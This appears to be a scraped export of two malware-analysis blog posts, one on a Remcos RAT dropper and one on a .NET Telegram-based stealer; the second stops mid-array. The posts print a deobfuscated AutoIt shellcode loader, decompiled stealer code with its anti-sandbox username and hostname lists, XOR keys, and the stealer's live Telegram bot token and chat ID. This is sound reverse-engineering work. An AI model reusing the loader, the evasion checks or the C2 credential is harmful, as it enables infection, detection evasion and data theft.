
[{"content":" Malware Analysis - RemcosRAT # So this blog is the first stage of my analysis of the Remcos RAT, I obtained this sample frmo malware bazaar. This contains the first stage of the malware, which is essentially a dropper stage of the malware\nFile Hash : # 7440ef0eba8981a16f223b10ccccd80671001258b5fd8e95e43161de32b1157d\nDetect it Easy : # CFF # it shows there\u0026rsquo;s something hiding inside .data as the size difference highlighted here is pretty significant\nAlso we see AutoIt is being used to perform some form of packing/encryption, which ties in well with the suspicious .data file\nEssentially autioIt is a scripting language that helps us automate keystrokes, mouse movement, application windows etc. correlated to GUI\nTo learn more about AUTO_IT:https://www.autoitscript.com/site/autoit/\nSo we go ahead and use\nAUTO IT RIPPER # Using Auto It Ripper\nAutoIt Script : # #NoTrayIcon\rFileInstall ( \u0026#34;Gehman\u0026#34; , @TempDir \u0026amp; \u0026#34;\\Gehman\u0026#34; , 1 )\r$YZBWDFOHF = EUQOQQURZ ( FileRead ( @TempDir \u0026amp; \u0026#34;\\Gehman\u0026#34; ) )\r$GWLGSEMT = DllCall ( EUQOQQURZ ( \u0026#34;lfsofm43\u0026#34; ) , EUQOQQURZ ( \u0026#34;qus\u0026#34; ) , EUQOQQURZ ( \u0026#34;WjsuvbmBmmpd\u0026#34; ) , EUQOQQURZ ( \u0026#34;expse\u0026#34; ) , EUQOQQURZ ( \u0026#34;1\u0026#34; ) , EUQOQQURZ ( \u0026#34;expse\u0026#34; ) , BinaryLen ( $YZBWDFOHF ) , EUQOQQURZ ( \u0026#34;expse\u0026#34; ) , EUQOQQURZ ( \u0026#34;1y4111\u0026#34; ) , EUQOQQURZ ( \u0026#34;expse\u0026#34; ) , EUQOQQURZ ( \u0026#34;1y51\u0026#34; ) ) [ 0 ]\r$GOKCQHWSA = DllStructCreate ( EUQOQQURZ ( \u0026#34;czuf!\\\u0026#34; ) \u0026amp; BinaryLen ( $YZBWDFOHF ) \u0026amp; EUQOQQURZ ( \u0026#34;^\u0026#34; ) , $GWLGSEMT )\rFileInstall ( \u0026#34;vehiculation\u0026#34; , @TempDir \u0026amp; \u0026#34;\\vehiculation\u0026#34; , 1 )\rDllStructSetData ( $GOKCQHWSA , 1 , $YZBWDFOHF )\rDllCall ( \u0026#34;user32.dll\u0026#34; , \u0026#34;ptr\u0026#34; , \u0026#34;CallWindowProc\u0026#34; , \u0026#34;ptr\u0026#34; , $GWLGSEMT + 9248 , \u0026#34;ptr\u0026#34; , 0 , \u0026#34;ptr\u0026#34; , 0 , \u0026#34;ptr\u0026#34; , 0 , \u0026#34;ptr\u0026#34; , 0 )\rFunc EUQOQQURZ ( $MTMLSQXJW )\rLocal $SHQXAENA = \u0026#34;\u0026#34;\rFor $QHCVRWGVOP = 1 To StringLen ( $MTMLSQXJW )\rLocal $ANHBBPGF = Asc ( StringMid ( $MTMLSQXJW , $QHCVRWGVOP , 1 ) )\r$SHQXAENA \u0026amp;= Chr ( $ANHBBPGF - ( 1 ^ $QHCVRWGVOP ) )\rNext\rReturn $SHQXAENA\rEndFunc :::\nPython Script to partially deobfuscate # import re\rre.compile(rEUQOQQURZ\\s*\\(\\s*\u0026#34;([^\u0026#34;]+)\u0026#34;\\s*\\))\rpattern = re.compile(r\u0026#39;EUQOQQURZ\\s*\\(\\s*\u0026#34;([^\u0026#34;]+)\u0026#34;\\s*\\)\u0026#39;)\rdef deobfuscate(s):\rclear_string = \u0026#39;\u0026#39;.join(chr(ord(i) - 1) for i in s)\rreturn clear_string\rwith open(\u0026#34;Auoit_Remcos.au3\u0026#34;, \u0026#34;r\u0026#34;) as f:\rx = f.read()\rdef replacer(match):\rmatched_string = match.group(1)\rdeobfuscated_string = deobfuscate(matched_string)\rreturn f\u0026#39;EUQOQQURZ(\u0026#34;{deobfuscated_string}\u0026#34;)\u0026#39;\rupdated_file = pattern.sub(replacer, x)\rwith open(\u0026#39;partially_deobfuscated_Autoit_Remcos.au3\u0026#39;, \u0026#39;w\u0026#39;) as f2:\rf2.write(updated_file) HEx string :\nCapstone # from capstone import Cs, CS_ARCH_X86, CS_MODE_32\rhex_data = \u0026#34;\u0026lt;insert hex string\u0026gt;\u0026#34;\rraw_bytes = bytes.fromhex(hex_data)\rshellcode_length = len(raw_bytes)\rprint(f\u0026#34;[+] Shellcode length: {shellcode_length} bytes\u0026#34;)\rwith open(\u0026#34;output.bin\u0026#34;, \u0026#34;wb\u0026#34;) as f:\rf.write(raw_bytes)\rprint(\u0026#34;[+] Wrote raw bytes to output.bin\u0026#34;)\r# Captsone Disassembly\rmd = Cs(CS_ARCH_X86, CS_MODE_32)\rassembly_output = []\rfor ins in md.disasm(raw_bytes, 0x1000):\rline = f\u0026#34;0x{ins.address:08x}: {ins.mnemonic} {ins.op_str}\u0026#34;\rassembly_output.append(line)\rwith open(\u0026#34;output.asm\u0026#34;, \u0026#34;w\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f:\rf.write(\u0026#34;\\n\u0026#34;.join(assembly_output))\rprint(\u0026#34;[+] Wrote disassembly to output.asm\u0026#34;) We use ida to open it now and see that around the offset of 9248 ie 0x2420 we have the name of the other file being referred to here, and we see it calling some functions to call certain dll\u0026rsquo;s\nDecompiling and revesing in IDA we see it is doing API hashing, it first traverses PEB etc. to get to kernel32.dll and then gets load library A which is uses for all other imports form other DLLs such as advapi32.dll, shell32.dll etc.\nwe write a c script that shows it for us accordinly\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;windows.h\u0026gt; unsigned int __stdcall Addr_mangler(unsigned char* Address) { int v2; // [esp+24h] [ebp-Ch] unsigned int v3; // [esp+2Ch] [ebp-4h] unsigned int v4; // [esp+2Ch] [ebp-4h] v2 = 0; v3 = 0xFFFFFFFF; while (Address[v2]) { v4 = (unsigned __int8)Address[v2] ^ v3; v3 = ((char)v4 \u0026gt;\u0026gt; 7) \u0026amp; 0xEDB88320 ^ ((int)(v4 \u0026lt;\u0026lt; 25) \u0026gt;\u0026gt; 31) \u0026amp; 0x76DC4190 ^ ((int)(v4 \u0026lt;\u0026lt; 26) \u0026gt;\u0026gt; 31) \u0026amp; 0x3B6E20C8 ^ ((int)(v4 \u0026lt;\u0026lt; 27) \u0026gt;\u0026gt; 31) \u0026amp; 0x1DB71064 ^ ((int)(v4 \u0026lt;\u0026lt; 28) \u0026gt;\u0026gt; 31) \u0026amp; 0x0EDB8832 ^ ((int)(v4 \u0026lt;\u0026lt; 29) \u0026gt;\u0026gt; 31) \u0026amp; 0x076DC419 ^ ((int)(v4 \u0026lt;\u0026lt; 30) \u0026gt;\u0026gt; 31) \u0026amp; 0xEE0E612C ^ ((int)(v4 \u0026lt;\u0026lt; 31) \u0026gt;\u0026gt; 31) \u0026amp; 0x77073096 ^ (v4 \u0026gt;\u0026gt; 8); ++v2; } return ~v3; } uint8_t* load_file(const char* path, DWORD* out_size) { FILE* f = NULL; fopen_s(\u0026amp;f, path, \u0026#34;rb\u0026#34;); if (!f) return NULL; fseek(f, 0, SEEK_END); DWORD size = ftell(f); fseek(f, 0, SEEK_SET); uint8_t* buf = (uint8_t*)malloc(size); fread(buf, 1, size, f); fclose(f); *out_size = size; return buf; } DWORD rva_to_offset(DWORD rva, IMAGE_SECTION_HEADER* sec, int count) { for (int i = 0; i \u0026lt; count; i++) { DWORD start = sec[i].VirtualAddress; DWORD end = start + sec[i].Misc.VirtualSize; if (rva \u0026gt;= start \u0026amp;\u0026amp; rva \u0026lt; end) return sec[i].PointerToRawData + (rva - start); } return 0; } int main(int argc, char** argv) { if (argc != 2) { printf(\u0026#34;Usage: %s \u0026lt;dll_path\u0026gt;\\n\u0026#34;, argv[0]); return 1; } // Values to match against // kernel32.dll //uint32_t targets[] = { 0x5C856C47, 0x649EB9C1,0xF7C7AE42,0x5688CBD8,0x9CE0D4A,0x5EDB1D72,0x40F6426D,0xB0F6E8A9,0x8436F795,0x19E65DB6,0x5B4219F8,0xCEF2EDA8,0xC4B4A94D,0x8B5819AE,0xAD56B042,0xAB40BF8D,0x759903FC,0xF29DDD0C,0x5AD76A06,0xCCE95612,0x251097CC,0xFC6B42F1,0xD9B20494,0xB09315F4,0x2E50340B,0xA1EFE929,0x95C03D0,0xA7FB4165,0xCD53F5DD,0xCB1508DC,0x3FC1BD8D,0x4552D021,0xC97C1FFF,0xE058BB45,0x906A06B0,0x7A3A310,0x80AF62E1 // }; // advapi32.dll //uint32_t targets[] = { 0x5C969BF4, 0xA8403ACE, 0xD78C27BF }; //user32.dll //uint32_t targets[] = { 0x89606806 }; //shell32.dll //uint32_t targets[] = { 0xC7652B3F , 0x74BAEF5F } // // shlwapi.dll; uint32_t targets[] = { 0xAA7B1778 }; int target_count = sizeof(targets) / sizeof(targets[0]); printf(\u0026#34;TARGET COUNT : %d\\n\u0026#34;, target_count); DWORD size; uint8_t* data = load_file(argv[1], \u0026amp;size); if (!data) { printf(\u0026#34;Could not read file.\\n\u0026#34;); return 1; } IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)data; if (dos-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) { printf(\u0026#34;Invalid MZ.\\n\u0026#34;); return 1; } IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(data + dos-\u0026gt;e_lfanew); if (nt-\u0026gt;Signature != IMAGE_NT_SIGNATURE) { printf(\u0026#34;Invalid PE.\\n\u0026#34;); return 1; } IMAGE_FILE_HEADER* fh = \u0026amp;nt-\u0026gt;FileHeader; IMAGE_OPTIONAL_HEADER* opt = \u0026amp;nt-\u0026gt;OptionalHeader; IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*) ((BYTE*)\u0026amp;nt-\u0026gt;OptionalHeader + fh-\u0026gt;SizeOfOptionalHeader); DWORD exp_rva = opt-\u0026gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress; if (!exp_rva) { printf(\u0026#34;No export table.\\n\u0026#34;); return 1; } DWORD exp_off = rva_to_offset(exp_rva, sections, fh-\u0026gt;NumberOfSections); IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(data + exp_off); DWORD name_count = exp-\u0026gt;NumberOfNames; DWORD funcs_rva = exp-\u0026gt;AddressOfFunctions; DWORD names_rva = exp-\u0026gt;AddressOfNames; DWORD ords_rva = exp-\u0026gt;AddressOfNameOrdinals; DWORD funcs_off = rva_to_offset(funcs_rva, sections, fh-\u0026gt;NumberOfSections); DWORD names_off = rva_to_offset(names_rva, sections, fh-\u0026gt;NumberOfSections); DWORD ords_off = rva_to_offset(ords_rva, sections, fh-\u0026gt;NumberOfSections); DWORD* funcs = (DWORD*)(data + funcs_off); DWORD* names = (DWORD*)(data + names_off); WORD* ords = (WORD*)(data + ords_off); printf(\u0026#34;\\nScanning exports of %s\\n\u0026#34;, argv[1]); printf(\u0026#34;-----------------------------------------------\\n\u0026#34;); for (DWORD i = 0; i \u0026lt; name_count; i++) { DWORD name_rva = names[i]; DWORD name_off = rva_to_offset(name_rva, sections, fh-\u0026gt;NumberOfSections); unsigned char* name = (unsigned char*)(data + name_off); WORD ordinal = ords[i]; DWORD func_rva = funcs[ordinal]; uint32_t hv = Addr_mangler(name); for (int t = 0; t \u0026lt; target_count; t++) { if (hv == targets[t]) { printf(\u0026#34;[MATCH] %-35s RVA=0x%08X Hash=0x%08X\\n\u0026#34;, name, func_rva, hv); } } } free(data); return 0; } This gets us\nC:\\Users\\A\\source\\repos\\Remcos_Exports_Extractor\\x64\\Release\u0026gt;Remcos_Exports_Extractor.exe C:\\Windows\\System32\\kernel32.dll TARGET COUNT : 37\nScanning exports of C:\\Windows\\System32\\kernel32.dll # Function Name RVA Hash CloseHandle 0x00056E40 0xB09315F4 CreateDirectoryW 0x000570B0 0x759903FC CreateFileW 0x000570F0 0xA1EFE929 CreateProcessW 0x0003C680 0x5C856C47 CreateThread 0x00033100 0x906A06B0 ExitProcess 0x000418A0 0x251097CC ExitThread 0x000AB7D7 0x80AF62E1 GetCommandLineW 0x00040F00 0xD9B20494 GetCurrentThread 0x00023510 0x19E65DB6 GetFileAttributesW 0x00057310 0xC4B4A94D GetFileSize 0x00057330 0xA7FB4165 GetFileSizeEx 0x00057340 0x8B5819AE GetModuleFileNameW 0x0003C580 0xFC6B42F1 GetModuleHandleW 0x0003B450 0x4552D021 GetProcAddress 0x00033C70 0xC97C1FFF GetProcessHeap 0x00023F90 0x40F6426D GetTempPathW 0x00057410 0x07A3A310 GetThreadContext 0x0003C6F0 0x649EB9C1 GetTickCount 0x00018600 0x5B4219F8 HeapAlloc 0x000AE8C4 0x5EDB1D72 HeapFree 0x00024980 0xB0F6E8A9 IsDebuggerPresent 0x0003D9A0 0x8436F795 IsWow64Process 0x00038290 0x2E50340B LoadLibraryA 0x00042D80 0x3FC1BD8D LoadLibraryW 0x0003F7C0 0xCB1508DC QueryPerformanceCounter 0x00023FB0 0xAD56B042 ReadFile 0x000574B0 0x095C03D0 ReadProcessMemory 0x0003B830 0xF7C7AE42 SetThreadContext 0x000450F0 0x5688CBD8 Sleep 0x00031980 0xCEF2EDA8 TerminateProcess 0x000425A0 0xAB40BF8D VirtualAlloc 0x00033C90 0x09CE0D4A VirtualFree 0x00035BF0 0xCD53F5DD WaitForSingleObject 0x00057030 0xE058BB45 WriteFile 0x000575C0 0xCCE95612 lstrcatW 0x00035110 0xF29DDD0C lstrcpyW 0x00033D10 0x5AD76A06 C:\\Users\\A\\source\\repos\\Remcos_Exports_Extractor\\x64\\Release\u0026gt;Remcos_Exports_Extractor.exe C:\\Windows\\System32\\advapi32.dll TARGET COUNT : 3\nScanning exports of C:\\Windows\\System32\\advapi32.dll # Function Name RVA Hash CryptAcquireContextW 0x000322A0 0x5C969BF4 CryptGenRandom 0x000340C0 0xD78C27BF CryptReleaseContext 0x00034200 0xA8403ACE C:\\Users\\A\\source\\repos\\Remcos_Exports_Extractor\\x64\\Release\u0026gt;Remcos_Exports_Extractor.exe C:\\Windows\\System32\\user32.dll TARGET COUNT : 1\nScanning exports of C:\\Windows\\System32\\user32.dll # Function Name RVA Hash GetCursorPos 0x00050C70 0x89606806 C:\\Users\\A\\source\\repos\\Remcos_Exports_Extractor\\x64\\Release\u0026gt;Remcos_Exports_Extractor.exe C:\\Windows\\System32\\shell32.dll TARGET COUNT : 2\nScanning exports of C:\\Windows\\System32\\shell32.dll # Function Name RVA Hash CommandLineToArgvW 0x0015FEB0 0x74BAEF5F SHGetFolderPathW 0x00158090 0xC7652B3F Scanning exports of C:\\Windows\\System32\\shlwapi.dll # Function Name RVA Hash PathCombineW 0x0000F100 0xAA7B1778 But these function addresses that are properply calculated with the RVA + base adddress are properly filled into an array which is what is returned, and in the array it\u0026rsquo;s all a bit in a different order\nSo the final function array is this\nFunction Array # Index Function A value 0 CreateProcessW a1 1 GetCursorPos a2 2 Sleep a3 3 GetTickCount 4 GetThreadContext 5 SetThreadContext 6 VirtualAlloc 7 PathCombineW 8 GetTempPathW 9 lstrcpyW 10 lstrcatW 11 CreateDirectoryW 12 WriteFile 13 SHGetFolderPathW 14 HeapAlloc 15 CommandLineToArgvW 16 GetProcessHeap 17 18 HeapFree 19 GetFileAttributesW 20 GetFileSizeEx 21 QueryPerformanceCounter 22 IsDebuggerPresent 23 GetCurrentThread 24 25 26 TerminateProcess 27 ExitProcess 28 ReadProcessMemory 29 GetModuleFileNameW 30 GetCommandLineW 31 32 CloseHandle a28 33 IsWow64Process a29 34 CreateFileW a30 35 ReadFile a31 36 GetFileSize a32 37 VirtualFree a33 38 LoadLibraryA 39 LoadLibraryW 40 CryptAcquireContextW 41 CryptGenRandom 42 CryptReleaseContext 43 GetModuleHandleW 44 GetProcAddress 45 WaitForSingleObject 46 CreateThread 47 ExitThread VB script in startup folder, to run isochronal\nTemp has gdehman and vehiculation\nC:\\Users\\Ryuzaki\\AppData\\Local\\porcelainization has isochronal\nVehicualtion Decrypt # key = b\u0026#39;BTXMXI3AJ3ZMW7CF\u0026#39;\rdecrypted_veh_bytes = b\u0026#39;\u0026#39;\rfor i,j in zip(veh_bytes, cycle(key)):\rdecrypted_veh_bytes += xor(i,j)\r# we get an MZ file\rwith open(\u0026#39;vehiculation_decryped\u0026#39;, \u0026#39;wb\u0026#39;) as w:\rw.write(decrypted_veh_bytes) 004C476BE056BD3794B2EE1F460C00A5 - License code\nIn the next part we shall go ahead and analyse the decrypted VEH bytes that contain the essence of the malware\n","date":"25 November 2025","externalUrl":null,"permalink":"/posts/remcosrat_first_stage/","section":"Welcome to Posts!","summary":"Contains the first stage of malware analysis for RemcosRat","title":"RemcosRat Dropper Stage","type":"posts"},{"content":" Malware Analysis Report - \u0026ldquo;generated30\u0026rdquo; # This covers the malware analysis report of the given file named generated_30 other names - conhost.exe, svchost.exe md5hash - 2517b502d7714a4e384044a0b6c2a157\nTarget - Windows\nThe analyzed sample is a .NET-based information-stealer that employs the Costura Fody packer (Costura.Fody) to embed and compress its managed dependencies within a single assembly. At runtime these dependencies are decompressed in-memory and resolved dynamically effectively reducing static signatures.\nThe malware maintains C2 communication via the Telegram Bot API where operator issued commands are received through a Telegram bot channel. Exfiltrated data including browser cookies and desktop screenshots is transmitted back to the operator through the same channel.\nFor persistence, the stealer leverages Windows autostart features such as registry run keys and startup folders to ensure execution across reboots\nAnti-VM checks (e.g., detection of virtualized environments based on system artifacts and hardware traits) Anti-sandbox logic to identify automated detonation environments through heuristic indicators Anti-debugging routines are implemented via timing checks\nThe malware incorporates self-deletion functionality to remove artifacts from disk after execution\nThe details of telegram bot acting as C2 is as given below\nBot token - 6890762661:AAFmz6vcAEVtyRktHezAUxQESQdrtr_vvrQ Bot ChatID - 6565043849\nNow let\u0026rsquo;s walkthrough the analysis\nBasic Analysis # Detect it easy # Opening it in Detect it Easy shows We understand that it is\nPE32 .NET binary Potentially compressed data found inside .text Json and Costura Libraries are being used There\u0026rsquo;s Anti Sanbox and Anti VM Static Analysis # FLOSS # We run floss on this and see a few interesting strings related to\nTelegram bot Cookie Stealer Suspicious commands Indicative of a C2 FLOSS OP TXT : https://gist.github.com/retr0ds/b19d5d20ef02e32eabe50e82f88ede91\nCapa # Running capa gives us a good amount of details\nCAPA output : https://gist.github.com/retr0ds/f4df689cf9496bcf2850952c5f6370d5\nDynamic Analysis # System Informer # Upon doing basic dynamic analysis of the malware by using System Informet we see it launches SVC host and from there it seems to launch a lot of chrome windows but in the background in a hidden manner. All of this ties well with the strings that we saw about the cookie stealer\nThe actual file conhost has self deleted itself succesfully and it is listed as a non existent process\nRather it seems to have launched a new process svchost.exe Seems to have launched another process called timeout.exe as well Comparing the hashes it is the same image file So it\u0026rsquo;s just copying itself into another directory\nAnd seems to be running itself from there under the name of svchost.exe\nRegSHOT # Using regshot we get to see a lot of registry keys approx 24000 was changed and a lot of folders were affected, I don\u0026rsquo;t attribute all of this to the malware, but a few of them might be. But rather than wasting time by scouring through all those keys I\u0026rsquo;ll go forward with reverse engineering the malware\nReverse Engineering # Now we get down to actually Reverse Engineering it in ILSpy or DnSpy, there are cases where one performs better than the other, so I figured might as well keep both of them open\nI use DnSpy to ocassionally debug and confirm my findings as well\nSo now loading it in IlSppy we see this Obviously we notice a few peculiar things,\nAssembly TItle - conhost Assembly Description - W0VPRl02ODkwNzYyNjYxOk5OU3ptNmlwTlJJZ2xFeGdVcm1OSGtEUkZEcWVnZV9paWVEfDY1NjUwNDM4NDl8TnFib3JIY3FuZ3JlfGZpcHViZmcucmtyfHR6bnZ5LnBieiBsYmhnaG9yLnBienxUYmJ0eXJIY3FuZ3J8VGJidHlySGNxbmdyZXxnZWhyfGdlaHJ8c255ZnJ8c255ZnJ8c255ZnJ8c255ZnJ8UVJaQg We also notice it has something called costura being used, which we can understand from the Die output during initial triaging as well\nGoogling Costura gets us the https://github.com/Fody/Costura which seems to be a way of linking all the dependencies in a compressed format and store it under references so that the application can decompress it during runtime and use it\nSo looking into references we do see quite a lot of compressed dll\u0026rsquo;s but most of them look very benign and mostly concerned with system related stuff, and nothing out of the ordinary I just decompressed costura dll using https://github.com/dr4k0nia/Simple-Costura-Decompressor/releases/tag/v2.1 and it looked very normal, so I\u0026rsquo;m assuming all those dlls were just stored using costura to package it into a single malware file than having multiple dlls So I don\u0026rsquo;t have an hunch on that right now at the moment.\nWith all of those in mind we go forward with getting to the Main of the Assembly which is usually found under Program\nFUNC_Main # AssemblyDescriptionAttribute assemblyDescriptionAttribute = Assembly.GetExecutingAssembly().GetCustomAttributes(typeof(AssemblyDescriptionAttribute), inherit: false).OfType\u0026lt;AssemblyDescriptionAttribute\u0026gt;() .FirstOrDefault(); if (assemblyDescriptionAttribute != null) { string text = assemblyDescriptionAttribute.Description.ToString(); string[] array = Encoding.UTF8.GetString(Convert.FromBase64String(text.Split(\u0026#39;}\u0026#39;)[0])).Substring(5).Split(\u0026#39;|\u0026#39;); if (array.Length \u0026gt;= 14) { config.TelegramToken = Rot13(array[0].ToString()); config.TelegramChatID = Rot13(array[1].ToString()); config.InstallPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + \u0026#34;\\\\\u0026#34; + Rot13(array[2].ToString()); config.InstallPathFixed = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + \u0026#34;\\\\\u0026#34; + Rot13(array[2].ToString()); config.InstallExeName = Rot13(array[3].ToString()); if (Rot13(array[4].ToString()) != \u0026#34;none\u0026#34; \u0026amp;\u0026amp; Rot13(array[4].ToString()) != \u0026#34;\u0026#34;) { config.startupURLs = Rot13(array[4].ToString()).Split(\u0026#39; \u0026#39;); } config.RegistryKey = Rot13(array[5].ToString()); config.AutorunName = Rot13(array[6].ToString()); config.AutorunEnabled = Rot13(array[7].ToString()).ToLower() == \u0026#34;true\u0026#34;; config.MeltFile = Rot13(array[8].ToString()).ToLower() == \u0026#34;true\u0026#34;; config.PreventStartOnVirtualMachine = Rot13(array[9].ToString()).ToLower() == \u0026#34;true\u0026#34;; config.BlockNetworkActivityWhenProcessStarted = Rot13(array[10].ToString()).ToLower() == \u0026#34;true\u0026#34;; config.StartupKill = Rot13(array[11].ToString()).ToLower() == \u0026#34;true\u0026#34;; config.NoInstall = Rot13(array[12].ToString()).ToLower() == \u0026#34;true\u0026#34;; if (Rot13(array[13].ToString()) != config.PrivateKey) { Environment.Exit(0); } This basically seems to take the suspicious description we saw early on, put it through base64 and rot13, and then set various variables under the config specificaltions of the current assembly to enable features accordingly\nSo doing that over cyberchef gets us this\n[RBS]6890762661:AAFmz6vcAEVtyRktHezAUxQESQdrtr_vvrQ|6565043849|AdobeUpdater|svchost.exe|gmail.com youtube.com|GoogleUpdate|GoogleUpdater|true|true|false|false|false|false|DEMO\nSo if we track the variables accordingly\nWe get\nConfig Values # config.TelegramToken = 6890762661:AAFmz6vcAEVtyRktHezAUxQESQdrtr_vvrQ config.TelegramChatID = 6565043849 config.InstallPath = C:\\Users\\\u0026lt;USERNAME\u0026gt;\\AppData\\Local\\AdobeUpdater config.InstallPathFixed = C:\\Users\\\u0026lt;USERNAME\u0026gt;\\AppData\\Local\\AdobeUpdater config.InstallExeName = svchost.exe\nconfig.startupURLs = [gmail.com,youtube.com] config.RegistryKey = GoogleUpdate config.AutorunName = GoogleUpdater config.AutorunEnabled = 1 config.MeltFile = 1 config.PreventStartOnVirtualMachine = 0 config.BlockNetworkActivityProcessStarted = 0 config.StartupKill = 0 config.NoInstall = 0 config.Privatekey = DEMO\nGoogling MeltFile gets us Basically that the file would delete itself after it has been installed, which is what we observed in the dynamic analysis part\nWe can also understand that it would install itself under \\AppData\\Local\\AdobeUpdater as svchost.exe which is a pretty common windows binary that malware usually use to disguise itself\nAnd that it has AutoRunEnabled for persistence, but it won\u0026rsquo;t attempt to prevent itself from starting in virutal machine, it won\u0026rsquo;t block network activity process, it won\u0026rsquo;t startupkill, it would continue installing\nThen we have this small block\nstring text2; using (WebClient webClient = new WebClient()) { text2 = webClient.DownloadString(config.CheckLink); } string[] array2 = text2.Split(\u0026#39;|\u0026#39;); foreach (string text3 in array2) { if (config.PrivateKey == text3) { telegram.sendText(\u0026#34;\\ud83d\\udd34Started a build with a blocked private key!\u0026#34;); Environment.Exit(0); So it downloads a string from config.CheckLink = https://raw.githubusercontent.com/attatier/Cloud/main/MilInfo.txt\ntext2 = 4.1|DEMO1|o3v4oGJplHlmFGJW2GgLmukJGPNgXC1g| and checks to see if any of the substrings matches DEMO and if it does it would exit, if not it goes on to the next major code block\nSo now following through with the next important code block\nConfig based behaviour changing # These set of if/else try/catch all depends on the config that the malware receives in the Assembly Description\n{ if (config.NoInstall) { config.InstallPath = Path.GetDirectoryName(Program.AssemblyLocation().ToString()); config.InstallExeName = Path.GetFileName(Program.AssemblyLocation().ToString()); } try { persistence.CheckCopy(); } catch (Exception) { } try { ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12; } catch (Exception) { } try { persistence.Sleep(); } catch (Exception) { } try { persistence.runAntiAnalysis(); } catch (Exception) { } if (!config.NoInstall) { try { persistence.installSelf(); } catch (Exception) { } } if (!config.NoInstall) { try { persistence.MeltFile(); } catch (Exception) { } } try { utils.isConnectedToInternet(); } catch (Exception) { } It doesn\u0026rsquo;t go into the first if condition, and goes into persistence.CheckCopy()\nFUNC_persistence.CheckCopy() # Which as the name suggests basically checks if another copy of the same process in running in the system or not, and if another one is then this one exits\nThen it sleeps for between 2 to 5 seconds Then we see it executing persistence.runAntiAnalysis. So it does attempt to prevent it from being analysed both debugging wise and VM wise\nIt checks if config.PreventStartOnVirutalMachine being set or not, in our case it is set to 0 so the upcoming functions such as\nInSandboxie inVirtualBox inDebugger don\u0026rsquo;t matter because of the \u0026amp;\u0026amp; condition but regardless we shall go about inspecting through them FUNC_inSandboxie() # public static bool inSandboxie() { string[] array = new string[5] { \u0026#34;SbieDll.dll\u0026#34;, \u0026#34;SxIn.dll\u0026#34;, \u0026#34;Sf2.dll\u0026#34;, \u0026#34;snxhk.dll\u0026#34;, \u0026#34;cmdvrt32.dll\u0026#34; }; for (int i = 0; i \u0026lt; array.Length; i++) { if (GetModuleHandle(array[i]).ToInt32() != 0) { return true; } } try { string machineName = Environment.MachineName; string userName = Environment.UserName; array = new string[40] { \u0026#34;WDAGUtilityAccount\u0026#34;, \u0026#34;Abby\u0026#34;, \u0026#34;hmarc\u0026#34;, \u0026#34;patex\u0026#34;, \u0026#34;RDhJ0CNFevzX\u0026#34;, \u0026#34;kEecfMwgj\u0026#34;, \u0026#34;Frank\u0026#34;, \u0026#34;8Nl0ColNQ5bq\u0026#34;, \u0026#34;Lisa\u0026#34;, \u0026#34;John\u0026#34;, \u0026#34;elz\u0026#34;, \u0026#34;george\u0026#34;, \u0026#34;PxmdUOpVyx\u0026#34;, \u0026#34;8VizSM\u0026#34;, \u0026#34;w0fjuOVmCcP5A\u0026#34;, \u0026#34;lmVwjj9b\u0026#34;, \u0026#34;PqONjHVwexsS\u0026#34;, \u0026#34;3u2v9m8\u0026#34;, \u0026#34;Julia\u0026#34;, \u0026#34;HEUeRzl\u0026#34;, \u0026#34;fred\u0026#34;, \u0026#34;server\u0026#34;, \u0026#34;BvJChRPnsxn\u0026#34;, \u0026#34;Harry Johnson\u0026#34;, \u0026#34;SqgFOf3G\u0026#34;, \u0026#34;Lucas\u0026#34;, \u0026#34;mike\u0026#34;, \u0026#34;PateX\u0026#34;, \u0026#34;h7dk1xPr\u0026#34;, \u0026#34;Louise\u0026#34;, \u0026#34;User01\u0026#34;, \u0026#34;test\u0026#34;, \u0026#34;jz\u0026#34;, \u0026#34;dx\u0026#34;, \u0026#34;elz\u0026#34;, \u0026#34;RGzcBUyrznReg\u0026#34;, \u0026#34;lK7sAXM\u0026#34;, \u0026#34;PNEwI\u0026#34;, \u0026#34;tim\u0026#34;, \u0026#34;admin\u0026#34; }; for (int i = 0; i \u0026lt; array.Length; i++) { if (array[i] == userName) { return true; } } array = new string[43] { \u0026#34;BEE7370C-8C0C-4\u0026#34;, \u0026#34;DESKTOP-NAKFFMT\u0026#34;, \u0026#34;WIN-5E07COS9ALR\u0026#34;, \u0026#34;B30F0242-1C6A-4\u0026#34;, \u0026#34;DESKTOP-VRSQLAG\u0026#34;, \u0026#34;Q9IATRKPRH\u0026#34;, \u0026#34;XC64ZB\u0026#34;, \u0026#34;DESKTOP-D019GDM\u0026#34;, \u0026#34;DESKTOP-WI8CLET\u0026#34;, \u0026#34;SERVER1\u0026#34;, \u0026#34;LISA-PC\u0026#34;, \u0026#34;JOHN-PC\u0026#34;, \u0026#34;DESKTOP-B0T93D6\u0026#34;, \u0026#34;DESKTOP-1PYKP29\u0026#34;, \u0026#34;DESKTOP-1Y2433R\u0026#34;, \u0026#34;WILEYPC\u0026#34;, \u0026#34;WORK\u0026#34;, \u0026#34;6C4E733F-C2D9-4\u0026#34;, \u0026#34;RALPHS-PC\u0026#34;, \u0026#34;DESKTOP-WG3MYJS\u0026#34;, \u0026#34;DESKTOP-7XC6GEZ\u0026#34;, \u0026#34;DESKTOP-5OV9S0O\u0026#34;, \u0026#34;QarZhrdBpj\u0026#34;, \u0026#34;ORELEEPC\u0026#34;, \u0026#34;ARCHIBALDPC\u0026#34;, \u0026#34;JULIA-PC\u0026#34;, \u0026#34;d1bnJkfVlH\u0026#34;, \u0026#34;NETTYPC\u0026#34;, \u0026#34;DESKTOP-BUGIO\u0026#34;, \u0026#34;DESKTOP-CBGPFEE\u0026#34;, \u0026#34;SERVER-PC\u0026#34;, \u0026#34;TIQIYLA9TW5M\u0026#34;, \u0026#34;DESKTOP-KALVINO\u0026#34;, \u0026#34;COMPNAME_4047\u0026#34;, 